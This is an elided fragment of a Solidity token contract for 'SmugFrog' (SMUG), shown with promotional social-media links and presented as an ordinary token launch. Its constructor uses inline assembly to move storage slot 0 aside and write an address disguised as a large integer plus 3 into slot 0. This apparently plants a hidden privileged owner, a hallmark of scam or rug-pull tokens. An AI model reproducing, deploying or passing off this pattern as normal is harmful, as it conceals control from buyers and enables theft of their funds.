...
Telegram: https://t.me/SmugFrog/
Twitter: https://twitter.com/SmugFrog/
Website: https://SmugFrog.io
...
contract SmugFrog {
    string public constant name = "SmugFrog";
    string public constant symbol = "SMUG";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1338573202391616006029577094277733719738850612471, 3))}
